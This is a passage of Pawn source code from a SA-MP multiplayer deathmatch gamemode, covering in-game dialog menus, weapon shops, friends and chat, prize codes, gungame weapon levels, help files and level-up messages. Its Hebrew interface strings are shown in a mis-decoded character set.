		case dialog_housemenu: ShowPlayerDialog(playerid,dialog_housemenu,DIALOG_STYLE_LIST,@c(lightblue) "рЇ∙°хщх· сщ·","ыЁщёф ьсщ·\n∙щтх° фсщ·\nфхёЇ· тщ∙ф ь∙чўя\nфё°· тщ∙ф ю∙чўя ючхс°\nфё°· тщ∙ф ь∙чўя ьр ючхс°\n°∙щю· сЄьщ фтщ∙х· ьсщ·\nрщЇхё ыь сЄьщ фтщ∙х· ьсщ·\nючщў· фсщ·\n"@c(red)"(/House Tele :ыущ ь∙Ёх· р· ф∙щтх° ьсщ· ф∙·ю∙ сЇўхуф)","счщ°ф","щЎщрф");
		case dialog_addons:
		{
			new content[512];
			format(content,sizeof(content),"Name\tAmmo\tLevel\tCost");
			for(new i = 0; i < sizeof(AmmunationSpecialItems); i++)
			{
				format(string,sizeof(string),@c(white) "%d) %s\t" @c(red) "%d\t" @c(yellow) "%d\t" @c(green) "%d$",i+1,AmmunationSpecialItems[i][aiName],AmmunationSpecialItems[i][aiAmmo],AmmunationSpecialItems[i][aiLevel],AmmunationSpecialItems[i][aiCost]);
				format(content,sizeof(content),!strlen(content) ? ("%s%s") : ("%s\n%s"),content,string);
			}
			ShowPlayerDialog(playerid,dialog_addons,DIALOG_STYLE_TABLIST_HEADERS,@c(lightblue) "чЁх· фЁ∙ўщэ -> ·хёЇщэ",content,"ўЁф","сщшхь");
		}
		case dialog_spw:
		{
			new content[512];
			for(new i = 1; i < sizeof(spAmmunation); i++)
			{
				format(string,sizeof(string),@c(grey) "%d) " @c(white) "%s%s" @c(yellow) "Level: " @c(lightyellow) "%d\t" @c(green) "%d$",i,spAmmunation[i][spaName],strlen(spAmmunation[i][spaName]) < 10 ? ("\t\t") : ("\t"),spAmmunation[i][spaLevel],spAmmunation[i][spaCost]);
				format(content,sizeof(content),!strlen(content) ? ("%s%s") : ("%s\n%s"),content,string);
			}
			ShowPlayerDialog(playerid,dialog_spw,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· фЁ∙ўщэ -> Ё∙ўщэ ющхчущэ",content,"ўЁф","сщшхь");
		}
		case dialog_ammusale:
		{
			new content[800], cost;
			for(new i = 0; i < sizeof(AmmunationSales); i++)
			{
				string = "";
				cost = AmmunationSales[i][asCost];
				for(new j = 0; j < 3; j++) if(AmmunationSales[i][asWeapons][j] != -1)
				{
                    cost += WeaponCost(playerid, AmmunationSales[i][asWeapons][j]);
					format(string,sizeof(string),!j ? ("%s%s") : ("%s + %s"),string,Ammunation[AmmunationSales[i][asWeapons][j]][aName]);
				}
				format(string,sizeof(string),@c(green) "[$%d] " @c(grey) "%s" @c(white) " :%s юсЎЄ",AmmunationSales[i][asCost],string,AmmunationSales[i][asName]);
				format(content,sizeof(content),!strlen(content) ? ("%s%s") : ("%s\n%s"),content,string);
			}
			ShowPlayerDialog(playerid,dialog_ammusale,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· фЁ∙ўщэ -> юсЎЄщэ",content,"ўЁф","сщшхь");
		}
		case dialog_music:
		{
			for(new i = 0; i < MAX_MUSIC_TYPES; i++) if(strlen(musictype[i]) > 2) format(string,sizeof(string),!strlen(string) ? ("%sХ {%s}%d) %s") : ("%s\nХ {%s}%d) %s"),string,HexStringOfColor(i % 2 == 0 ? white : lightyellow),i+1,musictype[i]);
			ShowPlayerDialog(playerid,dialog_music,DIALOG_STYLE_LIST,@c(lightblue) "...сч° ёхт юхцщўф",string,"счщ°ф","сщшхь");
		}
		case dialog_getsetting:
		{
			for(new i = 0, m = GetSettingItemsCount(0); i < m; i++) format(string,sizeof(string),!i ? ("%s{00FF00}%s:{FFFFFF} %s") : ("%s\n{00FF00}%s:{FFFFFF} %s"),string,GetSettingName(playerid,i,0,1),GetSettingName(playerid,i,playerinfo[playerid][getsetting][i]));
			ShowPlayerDialog(playerid,dialog_getsetting,DIALOG_STYLE_LIST,@c(lightblue) "сч° срчу ююЎсщ ф∙щтх° ∙с°∙щюф ыущ ь∙Ёх·",string,"∙щЁхщ","щЎщрф");
		}
		case dialog_border_me:
		{
			format(string,sizeof(string),@c(white) "%s" @c(yellow) " :фыщЁхщ ∙ьъ\n" @c(white) "%03d" @c(yellow) " :∙ьъ ID-ф",GetName(playerid),playerid);
			ShowPlayerDialog(playerid,dialog_border_me,DIALOG_STYLE_MSGBOX,@c(lightblue) "фю∙·ю∙ ∙ьъ",string,"рЇ∙°хщх·","ётх°");
		}
		case dialog_border_setting:
		{
			format(string,sizeof(string),playerinfo[playerid][bordervis] ? ("фё·°· ф∙х°ф") : ("фЎт· ф∙х°ф"));
			new col = rgba2hex(playerinfo[playerid][borderrgb][0],playerinfo[playerid][borderrgb][1],playerinfo[playerid][borderrgb][2],255);
			format(string,sizeof(string),"%s\n{%s}∙щЁхщ ЎсЄ\n∙щЁхщ ∙ўщЇх·",string,HexStringOfColor(col == 255 ? white : col));
			ShowPlayerDialog(playerid,dialog_border_setting,DIALOG_STYLE_LIST,@c(lightblue) "Є°щы· ∙х°· фющуЄ",string,"сч°","ётх°");
		}
		case dialog_clan: ClanDialog(playerid,clan_main);
		case dialog_diary:
		{
			new diary[1024];
			for(new i = 1; i <= MAX_DIARY_LINES; i++)
			{
				format(string,sizeof(string),"DiaryLine%d",i);
				GetPVarString(playerid,string,string,sizeof(string));
				if(equal(string,"None")) format(string,sizeof(string),@c(grey) "- рщя шўёш с∙х°ф цх -");
				format(diary,sizeof(diary),i == 1 ? ("%s%02d) %s") : ("%s\n%02d) %s"),diary,i,string);
			}
			ShowPlayerDialog(playerid,dialog_diary,DIALOG_STYLE_LIST,@c(lightblue) "(фщхюя ∙ьъ (ыущ ьы·хс сч° ∙х°ф",diary,"Є°щыф","ётх°");
		}
		case dialog_friends:
		{
			new ffs[400];
			format(ffs,sizeof(ffs),@c(green) "+ фхёЇ· чс° чу∙");
			for(new i = 1, c = 0, id = INVALID_PLAYER_ID; i <= MAX_FRIENDS; i++)
			{
				format(string,sizeof(string),"Friend_%d",i);
				GetPVarString(playerid,string,string,sizeof(string));
				if(!equal(string,"None"))
				{
					id = GetExactID(string);
					format(ffs,sizeof(ffs),"%s\n%d. %s",ffs,++c,string);
					if(IsPlayerConnected(id)) format(ffs,sizeof(ffs),"%s [ID %03d]",ffs,id);
				}
			}
			ShowPlayerDialog(playerid,dialog_friends,DIALOG_STYLE_LIST,@c(lightblue) "°∙щю· чс°щэ",ffs,"ючщўф","щЎщрф");
		}
		case dialog_friendsmsg:
		{
			new stri[M_S];
			format(stri, M_S, @c(grey) ":рЁр фўьу р· ффхуЄф");
			if(param != 0) switch(param)
			{
				case 1: strcat(stri, "\n- .рщя рЇ∙°х· ьф∙рщ° фхуЄф °щўф");
				case 2: strcat(stri, "\n- .ффхуЄф р°хыф юущ");
				//case 3: strcat(stri, "\n- .ЁхЎ°ф сЄщф. рЁр уххч ьфЁфь· фўфщьф");
			}
			ShowPlayerDialog(playerid, dialog_friendsmsg, DIALOG_STYLE_INPUT, @c(grey) ":ф∙р° фхуЄф", stri, "ф∙р°", "сщшхь");
		}
		case dialog_friendsopt:
		{
			format(string,sizeof(string),"Friend_%d",playerinfo[playerid][friendclick]);
			GetPVarString(playerid,string,string,sizeof(string));
			format(string,sizeof(string),@c(lightblue) "%s :чс°",string);
			ShowPlayerDialog(playerid,dialog_friendsopt,DIALOG_STYLE_LIST,string,"фхЎр ю°∙щю· фчс°щэ\nфцюя ьЎ'рш\nф∙р° фхуЄф ьф·чс°х· фсрф","сч°","чцх°");
		}
		case dialog_chatm:
		{
			new header[64], chname[64];
			format(header,sizeof(header),"{%s}Ў'рш: %s",HexStringOfColor(chatinfo[playerid][chatColor]),chatinfo[playerinfo[playerid][inchat]][chatTitle]);
			format(string,sizeof(string),@c(white) "юцЄ° Ў'рш\n°∙щю· ю∙··Їщэ\n" @c(red) "щЎщрф юфЎ'рш");
			if(strlen(chatinfo[playerinfo[playerid][inchat]][chatTitle]) > 15)
			{
				strmid(chname,chatinfo[playerinfo[playerid][inchat]][chatTitle],0,12);
				format(chname,sizeof(chname),"%s...",chname);
			}
			else format(chname,sizeof(chname),chatinfo[playerinfo[playerid][inchat]][chatTitle]);
			if(chatinfo[playerinfo[playerid][inchat]][chatManager] == playerid) format(string,sizeof(string),"%s\n" @c(white) "фцюя ьЎ'рш\nфё°ф юфЎ'рш\n∙Ёф ых·°·: %s\n{%s}∙Ёф ЎсЄ\n%s :∙Ёф юЁфь",string,chname,HexStringOfColor(chatinfo[playerinfo[playerid][inchat]][chatColor]),GetName(chatinfo[playerinfo[playerid][inchat]][chatManager]));
			ShowPlayerDialog(playerid,dialog_chatm,DIALOG_STYLE_LIST,header,string,"сч°","чцх°");
		}
		case dialog_admintoggle:
		{
			new list[512];
			for(new i = 0; i < sizeof(AdminToggleType); i++) format(list,sizeof(list),!i ? ("%s%d: {%s}%s%s (%s)") : ("%s\n%d: {%s}%s%s (%s)"),list,AdminToggleType[i][atLevel],HexStringOfColor(playerinfo[playerid][atoggle][i] ? green : red),playerinfo[playerid][atoggle][i] ? ("[ON]\t\t") : ("[OFF]\t"),AdminToggleType[i][atHebName],AdminToggleType[i][atCommand]);
			ShowPlayerDialog(playerid,dialog_admintoggle,DIALOG_STYLE_LIST,@c(lightblue) "Admin Toggle",list,"∙щЁхщ","щЎщрф");
		}
		case dialog_lottoquestion: ShowPlayerDialog(playerid,dialog_lottoquestion,DIALOG_STYLE_LIST,@c(lightblue) "∙рьф Єь ЇЄщьх· фьхшх","...фрэ фюёЇ° ўшя ю\n...фрэ фюёЇ° тухь ю","фю∙ъ","сщшхь");
		case dialog_silence:
		{
			for(new i = IsPlayerMAdmin(playerid) ? 0 : 1; i < max_silence_types; i++) format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,SilenceStrings[i]);
			ShowPlayerDialog(playerid,dialog_silence,DIALOG_STYLE_LIST,@c(lightblue) ":сч° юф с°ЎхЁъ ьф∙·щў",string,"ф∙·ў","щЎщрф");
		}
		case dialog_rewards: ShowPlayerDialog(playerid,dialog_rewards,DIALOG_STYLE_LIST,@c(lightblue) "цырх· ьЇ°ёщэ","ёыхэ щхющ\nёыхэ ёхЇ\"∙\nфт°ёф фўхую· ∙ь фюху","ўсь","ётх°");
	}
	return 1;
}
//=[AddRandomCode]==============================================================
stock AddRandomCode()
{
	new rnd = randomEx(5,8), chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", p = 0, a = 0, code[32], string[64];
	for(new t = 0; t < rnd; t++) format(code,sizeof(code),"%s%c",code,chars[random(sizeof(chars))]);
	fsetstring(file_codes,"19CodeText",code);
	p = randomEx(1,sizeof(Codes));
	fsetint(file_codes,"19CodePrize",p);
	a = !Codes[p][cdMaxVal] ? 0 : randomEx(Codes[p][cdSID] > 0 ? 1 : Codes[p][cdMinVal],(Codes[p][cdSID] > 0 ? 4 : Codes[p][cdMaxVal])+1);
	switch(p)
	{
		case 1, 2: a = floatround(randomEx(100,15001));
		case 3, 6: a = randomEx(0,101);
		default: a = 0;
	}
	fsetint(file_codes,"19PrizeAmount",a);
	if(a > 0) format(string,sizeof(string),@c(grey) "Code: " @c(white) "%s" @c(grey) " (%d %s)",code,a,Codes[p][cdName]);
	else format(string,sizeof(string),@c(grey) "Code: " @c(white) "%s" @c(grey) " (%s)",code,Codes[p][cdName]);
	return string;
}
//=[SupriseCode]================================================================
stock SupriseCode(playerid)
{
	new string[64], botexts[][64] =
	{
		" !юць шхс! ўщсь· Ї°ё ∙ь ўху сЇ°шщ",
		" PM-щЇф! :) ∙ьч·щ ьъ ўху ю·Ёф с",
		" (; ыь фысху! ∙ьч·щ ьъ ўху Єь ч∙схя фсщ· сЇ°шщ",
		" [= ххрх! ўщсь· ўху ю·Ёф, Єьщщ"
	};
	BotSay(botexts[random(sizeof(botexts))],true);
	format(string,sizeof(string)," PM from %s: %s",botname,AddRandomCode());
	SendClientMessage(playerid,0xFFFF00FF,string);
	return 1;
}
//=[UpdatePropertyText]=========================================================
stock UpdatePropertyText(pid)
{
	new string[M_S], own[64];
	format(string,sizeof(string),"/DM/Properties/%d.ini",pid);
	format(own,sizeof(own),fgetstring(string,"Owner"));
	format(string,sizeof(string),@c(lightblue) "(%d Ёыё юёЇ°) %s" @c(lightyellow) " :Ёыё",pid+1,propinfo[pid][pname]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "$%d" @c(lightyellow) " :ючщ°",string,propper(propinfo[pid][pcost]));
	format(string,sizeof(string),"%s\n" @c(lightblue) "$%d" @c(lightyellow) " :°ххч",string,propper(propinfo[pid][pearning]));
	if(equal(own,"None"))
	{
		format(string,sizeof(string),"%s\n" @c(lightyellow) " сЄьщэ: " @c(lightblue) "рщя",string);
		format(string,sizeof(string),"%s\n" @c(lightyellow) "(/buy :ьўЁщщф)",string);
	}
	else format(string,sizeof(string),"%s\n" @c(lightblue) "%s" @c(lightyellow) " :сЄьщэ",string,own);
	if(propinfo[pid][spid] > 0) format(string,sizeof(string),"%s\n" @c(lightyellow) " Ёыё ющхчу: " @c(lightblue) "ыя",string);
	format(string,sizeof(string),"%s\n" @c(lightyellow) " Ёыё ющхчу: " @c(lightblue) "%s",string,propinfo[pid][spid] > 0 ? ("ыя") : ("ьр"));
	SetPickupText(propinfo[pid][ppickup],string);
	return 1;
}
//=[UpdateHouseText]============================================================
stock UpdateHouseText(hid)
{
	new string[M_S], own[64];
	format(string,sizeof(string),"/DM/Houses/%d.ini",hid);
	format(own,sizeof(own),fgetstring(string,"Owner"));
	format(string,sizeof(string),@c(lightgreen) "сщ· юёЇ° %d",hid);
	format(string,sizeof(string),"%s\n" @c(lightblue) "%d" @c(lightgreen) " :тхуь",string,houseinfo[hid][hsize]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "$%d" @c(lightgreen) " :ючщ°",string,houseinfo[hid][hcost]);
	if(equal(own,"None")) format(string,sizeof(string),"%s\n" @c(lightgreen) " сЄьщэ: " @c(lightblue) "рщя",string);
	else format(string,sizeof(string),"%s\n" @c(lightblue) "%s" @c(lightgreen) " :сЄьщэ",string,own);
	SetPickupText(houseinfo[hid][hpickup],string);
	return 1;
}
//=[GivePlayerDMZLevelWeapons]==================================================
stock GivePlayerDMZLevelWeapons(playerid)
{
	switch(playerinfo[playerid][dmzone])
	{
		case dmz_gungame:
		{
			ResetWeapons(playerid);
			switch(playerinfo[playerid][dmzlevel])
			{
				case 0..1: GiveWeapon(playerid,23,10000);
				case 2:
				{
					SetPlayerSkillLevel(playerid,0,200);
					GiveWeapon(playerid,22,10000);
				}
				case 3:
				{
					SetPlayerSkillLevel(playerid,0,999);
					GiveWeapon(playerid,22,10000);
				}
				case 4:
				{
					SetPlayerSkillLevel(playerid,2,200);
					GiveWeapon(playerid,24,10000);
				}
				case 5: GiveWeapon(playerid,25,10000);
				case 6: GiveWeapon(playerid,29,10000);
				case 7: GiveWeapon(playerid,27,10000);
				case 8: GiveWeapon(playerid,30,10000);
				case 9:
				{
					SetPlayerSkillLevel(playerid,9,200);
					GiveWeapon(playerid,31,10000);
				}
				case 10: GiveWeapon(playerid,34,10000);
				case 11:
				{
					SetPlayerSkillLevel(playerid,2,999);
					GiveWeapon(playerid,24,10000);
				}
				case 12:
				{
					SetPlayerSkillLevel(playerid,9,999);
					GiveWeapon(playerid,31,10000);
				}
				case 13: GiveWeapon(playerid,18,10);
				case 14: GiveWeapon(playerid,18,10000);
				case 15: GiveWeapon(playerid,16,10);
				case 16: GiveWeapon(playerid,16,10000);
				case 17: GiveWeapon(playerid,37,10000);
				case 18: GiveWeapon(playerid,35,5);
				case 19: GiveWeapon(playerid,35,10000);
				case 20: GiveWeapon(playerid,36,5);
				case 21: GiveWeapon(playerid,36,10000);
				case 22: GiveWeapon(playerid,9,0);
				case 23: GiveWeapon(playerid,38,10);
				case 24: GiveWeapon(playerid,38,100);
				case 25: GiveWeapon(playerid,38,10000);
			}
		}
		case dmz_shavuot:
		{
			ResetWeapons(playerid);
			SetFreeze(playerid,1);
			SetFreeze(playerid,0);
			switch(playerinfo[playerid][dmzlevel])
			{
				case 0..1: GiveWeapon(playerid,23,10000);
				case 2: GiveWeapon(playerid,29,10000);
				case 3: GiveWeapon(playerid,33,10000);
				case 4: GiveWeapon(playerid,35,10000);
			}
			SetTimerEx("ShavuotSkin",1000,0,"i",playerid);
		}
	}
}
//=[CreatePetText]==============================================================
stock CreatePetText(petid,Float:x,Float:y,Float:z)
{
	new string[256];
	format(string,sizeof(string),@c(lightblue) "(%s) %s" @c(lightgreen) " :чщф",Pets[petid][petHebName],Pets[petid][petName]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "$%d" @c(lightgreen) " :ючщ°",string,Pets[petid][petCost]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "%d" @c(lightgreen) " :°юф у°х∙ф",string,Pets[petid][petLevel]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "%.1f" @c(lightgreen) " :тхуь фчщф",string,Pets[petid][petSize]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "%.1f" @c(lightgreen) " :шххч °рщщф",string,Pets[petid][petRadius]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "%.1f" @c(lightgreen) " :ф·ўЇф",string,Pets[petid][petDamage]);
	format(string,sizeof(string),"%s\n" @c(lightblue) "%.1f" @c(lightgreen) " :юфщ°х·",string,Pets[petid][petSpeed]);
	Create3DTextLabel(string,lightblue,x,y,z+2.0,50.0,world_normal,1);
	return 1;
}
//=[PlayerTeamedWith]===========================================================
stock PlayerTeamedWith(playerid,id)
	return ((playerinfo[playerid][clan] == playerinfo[id][clan] && playerinfo[playerid][clan] != 0) ||
	(playerinfo[playerid][gang] == playerinfo[id][gang] && playerinfo[playerid][gang] != 0));
//=[IsPlayerInStore]============================================================
stock IsPlayerInStore(playerid,storeid) return GetPlayerCheckpoint(playerid) == cp_store && IsPlayerInCheckpoint(playerid) && cpinfo[playerinfo[playerid][cp]][cppar] == storeid;
//=[ShowModeHelp]===============================================================
stock ShowModeHelp(playerid,menuid)
{
	new f[M_S];
	format(f,sizeof(f),folder_help "%d.txt",menuid);
	if(fexist(f))
	{
		new File:fh, read[M_S], dia[2048];
		fh = fopen(f,io_read);
		if(fh)
		{
			while(fread(fh,read)) if(read[0] != ';' && strfind(read,"=") == -1) format(dia,sizeof(dia),"%s%s",dia,ColouredChat(read));
			fixchars(dia);
			fclose(fh);
			format(f,sizeof(f),@c(darkblue) "%s - ·Ї°щш Єц°ф юёЇ° %d",modehelpheader[menuid-1],menuid);
			ShowPlayerDialog(playerid,dialog_modehelpmenu,DIALOG_STYLE_MSGBOX,f,dia,"чцх°","щЎщрф");
		}
		else ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "·Ї°щш Єц°ф",@c(red) ".стьь сЄщф шыЁщ·, ьр фщф Ёщ·я ьфЎщт р· ·Ї°щш фЄц°ф, рЁр Ёёф ∙хс юрхч° щх·°","OK","");
	}
	return 1;
}
//=[UpdateModeHelpHeaders]======================================================
stock UpdateModeHelpHeaders()
{
	numOfHelpModes = -1, modehelpdialog = "";
	dbg(11,"16a");
	format(modehelpdialog,M_S_D,@c(darkblue) "\t\t!с°хыщэ фсрщэ ь·Ї°щш фЄц°ф ∙ь фюху ∙ьЁх");
	format(modehelpdialog,M_S_D,"%s\n\n" @h(7BA7E1) "!хфхр фтухь сщх·° ср°ї юёхтх хсщя фтухьщэ сЄхьэ DeathMatch фюху ∙ьЁх Єхёў сёхт ю∙чў ∙ь",modehelpdialog);
	format(modehelpdialog,M_S_D,"%s\n" @h(7BA7E1) ".фхр юыщь ыюх· тухьф ∙ь юЄ°ых· хрЇ∙°хщх· ю∙чў ютххЁх· хюфЁх·",modehelpdialog);
	format(modehelpdialog,M_S_D,"%s\n\n" @h(6094DB) ":р·э юхцюЁщэ ьсчх° р· юёЇ° фюЄ°ы· ∙Єьщф р·э °хЎщэ ьўсь ющуЄ\n",modehelpdialog);
	dbg(11,"16b");
	//new headerColors[] = {0xFF0000FF,0xFF3333FF,0xFFFF00FF,0xFF0099FF,0x6600FFFF,0x0000FFFF,0x000066FF,0x003300FF,0x00FF00FF,0x33FF66FF,0x33FFFFFF,0x666666FF,0xFF9966FF,0x9999FFFF,0x74138CFF,0xB05F3CFF,0x59DF00FF,0xCCCCFFFF,0xFFFFFFFF};
	for(new i = 1, cur = 0, ln = 0, f[64]; i <= MAX_MODE_HELP && numOfHelpModes == -1; i++)
	{
		format(f,sizeof(f),folder_help "%d.txt",i);
		if(fexist(f))
		{
			format(modehelpheader[i-1],sizeof(modehelpheader[]),fgetstring(f,"Header"));
			cur++;
			if(cur == 1) format(modehelpdialog,M_S_D,"%s\n{%s}%s - %d",modehelpdialog,HexStringOfColor(/*headerColors[ln]*/i % 2 == 0 ? (cur % 2 == 0 ? 0xE6E6E6FF : 0xFFFFFFAA) : (cur % 2 == 0 ? 0xAAAAAAFF : 0x6E6E6EFF)),modehelpheader[i-1],i);
			else
			{
				format(modehelpdialog,M_S_D,"%s Х %s - %d",modehelpdialog,modehelpheader[i-1],i);
				if(cur >= 5) cur = 0, ln++;
			}
		}
		else numOfHelpModes = i-1;
	}
	dbg(11,"16-D");
	format(modehelpdialog,M_S_D,"%s\n\n" @h(6094DB) webpage @h(7BA7E1)" :ющуЄ юЇх°ш щх·° хюу°щыщэ ·хыьх ьюЎхр сЇх°хющэ ∙ьЁх",modehelpdialog);
	dbg(11,"16-D");
	return 1;
}
//=[ModeHelpFromName]===========================================================
stock ModeHelpFromName(mh[])
{
	for(new i = 0; i < numOfHelpModes; i++) if(strfind(modehelpheader[i],mh,false) != -1) return i + 1;
	return 0;
}
//=[OutOfDMZone]================================================================
stock OutOfDMZone(playerid)
{
    if(IsPlayerInAnyVehicle(playerid)) SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	ResetWeapons(playerid);
	ResetAttachedObjects(playerid);
	playerinfo[playerid][noticedmsg][3] = 0;
	playerinfo[playerid][dmzkills] = 0;
	if(playerinfo[playerid][dmzone] == dmz_shavuot) playerinfo[playerid][shavuot] = 0;
	if(playerinfo[playerid][dmzone] == dmz_boats) DestroyVehicle(playerinfo[playerid][bvehicle]);
	playerinfo[playerid][dmzone] = dmz_none;
	playerinfo[playerid][tdmzone] = tdmz_none;
	if(playerinfo[playerid][tooktempickup]) RemovePlayerTDMPickup(playerid,-1,-1.0);
	playerinfo[playerid][dmzlevel] = 0;
	SetPlayerToNormalColor(playerid);
	if(IsPlayerUsingSGuard_(playerid)) SetPlayerGravity(playerid,0.008000); // guard_shit
	for(new i = 0; i <= 10; i++) SetPlayerSkillLevel(playerid,i,999);
	return 1;
}
//=[GoogleTranslate]============================================================
stock GoogleTranslate(fromlang[],tolang[],string[],playerid = INVALID_PLAYER_ID)
{
	if(strfind(string," ") != -1) for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == ' ') string[i] = '+';
	new url[256];
	format(url,sizeof(url),"translate.google.com/translate_t?hl=&ie=UTF-8&text=%s&sl=%s&tl=%s#",string,fromlang,tolang);
	HTTP(playerid,HTTP_GET,url,"","ResponseOfGoogleTranslate");
	return 1;
}
//=[ResponseOfGoogleTranslate]==================================================
forward ResponseOfGoogleTranslate(index,response_code,data[]);
public ResponseOfGoogleTranslate(index,response_code,data[])
{
	if(response_code == 200)
	{
		if(index != INVALID_PLAYER_ID)
		{
			new p = strfind(data,"this.style.backgroundColor");
			if(p == -1) return SendClientMessage(index,red," .(ф·°тхэ Ёы∙ь (сЄщф #1"), 0;
			strdel(data,0,p);
			strdel(data,0,85);
			new p2 = strfind(data,"<");
			if(p2 == -1) return SendClientMessage(index,red," .(ф·°тхэ Ёы∙ь (сЄщф #2"), 0;
			strdel(data,p2,strlen(data));
			SendClientMessage(index,lightyellow," :Google Translate ·°тхэ Єь щущ");
			SendClientMessage(index,white,data);
		}
	}
	else
	{
		if(index != INVALID_PLAYER_ID) SendClientMessage(index,red," .(ф·°тхэ Ёы∙ь (сЄщф #3");
		return 0;
	}
	return 1;
}
//=[TeamActivityWin]============================================================
stock TeamActivityWin(teamid)
{
	new string[M_S], col, nm[32];
	if(teamid == 1)
	{
		format(nm,sizeof(nm),TeamActivities[teamactinfo[4]][taT1Name]);
		col = TeamActivities[teamactinfo[4]][taT1Color];
	}
	else if(teamid == 2)
	{
		format(nm,sizeof(nm),TeamActivities[teamactinfo[4]][taT2Name]);
		col = TeamActivities[teamactinfo[4]][taT2Color];
	}
	format(string,sizeof(string)," Х !%s-фщр фўсхЎф фюЁЎч· с {%s}%s" @c(yellow) " фўсхЎф",TeamActivities[teamactinfo[4]][taName],col,nm);
	SendClientMessageToAll(yellow,string);
	format(string,sizeof(string),"%s won in %s!",nm,TeamActivities[teamactinfo[4]][taName]);
	MovingText(string,mt_activity,col);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inteamact])
	{
		SetPlayerInterior(i,0);
		SpawnPlayer(i);
		act_SaveWin(i,act_Code(aid_teams,teamactinfo[4]));
  		GiveMoney(i,headserver != i ? actprize_teamact : actprize_teamact*2,10);
		playerinfo[i][inteamact] = 0, playerinfo[i][waitteamact] = 0, playerinfo[i][teamactid] = -1, playerinfo[i][teamactteam] = 0;
		playerinfo[i][inact] = 0;
	}
	for(new i = 0; i < sizeof(teamactinfo); i++) if(i != 3) teamactinfo[i] = 0;
	KillTimer(teamactinfo[3]);
	thereIsAct = false;
}
//=[Timer_Set]==================================================================
#undef SetTimer
stock Timer_Set(funcname[],interval,repeating)
{
	new n = SetTimer(funcname,interval,repeating);
	if(repeating) SetProperty_INT(timerprop(n),1);
	return n;
}
#define SetTimer Timer_Set
//=[Timer_Kill]=================================================================
#undef KillTimer
stock Timer_Kill(timerid)
{
	if(PropertyExists_INT(timerprop(timerid)))
	{
		RemoveProperty_INT(timerprop(timerid));
		KillTimer(timerid);
	}
	return 1;
}
stock KillTimer2(timerid) return KillTimer(timerid);
#define KillTimer Timer_Kill
//=[CleanTimerVariable]=========================================================
stock CleanTimerVariable(timerid)
{
	if(PropertyExists_INT(timerprop(timerid))) RemoveProperty_INT(timerprop(timerid));
	return 1;
}
//=[PlayerLevelUp]==============================================================
stock PlayerLevelUp(playerid,bool:showall = true)
{
	if(playerinfo[playerid][level] < sizeof(levels)-1)
	{
		new l = 0, dia[1024], newCommands = 0, string[M_S];
		for(new i = 1; i < sizeof(levels); i++) if(playerinfo[playerid][kills] >= levels[i][NeedKills]) l = i; else break;
		playerinfo[playerid][level] = l;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"PlayerLevel",l);
		format(dia,sizeof(dia),@c(orange) "Х !Єьщ· ь°юф %d",l);
		format(dia,sizeof(dia),"%s\n:ф·Ї°щш фср щ°рф ьъ сюф ф·чу∙· Х " @c(lightred) "%s" @c(orange) " :ых·°· ф°юф фчу∙ф ∙ўщсь· фщр",dia,levels[l][LevelName]);
		if(levels[l][BankLimit] > levels[l - 1][BankLimit] && levels[l][AmmoLimit] > levels[l - 1][AmmoLimit]) format(dia,sizeof(dia),"%s\n" @c(orange) "Х (фтсь· фсЁў фчу∙ф ∙ьъ фщр %d$ (Єь·ф с-$%d) хфтсь· ючёЁщх· фЁ∙ў фчу∙ф ∙ьъ фщр %d (Єь·ф с-%d",dia,levels[l][BankLimit],levels[l][BankLimit] - levels[l - 1][BankLimit],levels[l][AmmoLimit],levels[l][AmmoLimit] - levels[l - 1][AmmoLimit]);
		else if(levels[l][BankLimit] > levels[l - 1][BankLimit]) format(dia,sizeof(dia),"%s\n" @c(orange) "Х (фтсь· фсЁў фчу∙ф ∙ьъ фщр #%d (Єь·ф с-#$%d",dia,levels[l][BankLimit],levels[l][BankLimit] - levels[l - 1][BankLimit]);
		else if(levels[l][AmmoLimit] > levels[l - 1][AmmoLimit]) format(dia,sizeof(dia),"%s\n" @c(orange) "Х (фтсь· ючёЁщх· фЁ∙ў фчу∙ф ∙ьъ фщр %d (Єь·ф с-%d",dia,levels[l][AmmoLimit],levels[l][AmmoLimit] - levels[l - 1][AmmoLimit]);
		for(new i = 0; i < sizeof(lcmds); i++) if(lcmds[i][lcLevel] == l) newCommands++;
		if(newCommands > 0)
		{
			format(dia,sizeof(dia),"%s\n\n" @c(purple) "Х :(фЇўхух· фсрх· ЁЇ·чх ь°юф ∙ьъ (%d" @c(orange),dia,newCommands);
			newCommands = 0;
			for(new i = 0; i < sizeof(lcmds); i++) if(lcmds[i][lcLevel] == l) format(dia,sizeof(dia),"%s\n%d) %s",dia,++newCommands,lcmds[i][lcCommand]);
		}
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Tl] == l) newCommands++;
		if(newCommands > 0)
		{
			format(dia,sizeof(dia),"%s\n\n" @c(purple) "Х :(ф∙щтх°щэ фсрщэ ЁЇ·чх ь°юф ∙ьъ (%d" @c(orange),dia,newCommands);
			newCommands = 0;
			for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Tl] == l) format(dia,sizeof(dia),"%s\n%d) %s",dia,++newCommands,Teleports[i][Tcmd]);
		}
		newCommands = 0;
		if(showall)
		{
			new mny = randomEx(5,11) * 25, status = GetPlayerStatus(playerid);
			format(dia,sizeof(dia),"%s\n\n" @c(green) "Єь ыъ ∙Єьщ· °юф ўщсь· ёыхэ ыёє ∙ь %d$",dia,mny);
			if(status == status_act && !actinfo[actExist]) format(dia,sizeof(dia),"%s\n!хюыщххя ∙фф°щтф ∙ьъ ЁЄ∙·ф сЇЄщьх·, ёыхэ фыёє юхыЇь хфхЇъ ь %d$",dia,mny *= 2);
			GiveMoney(playerid,mny,47);
		}
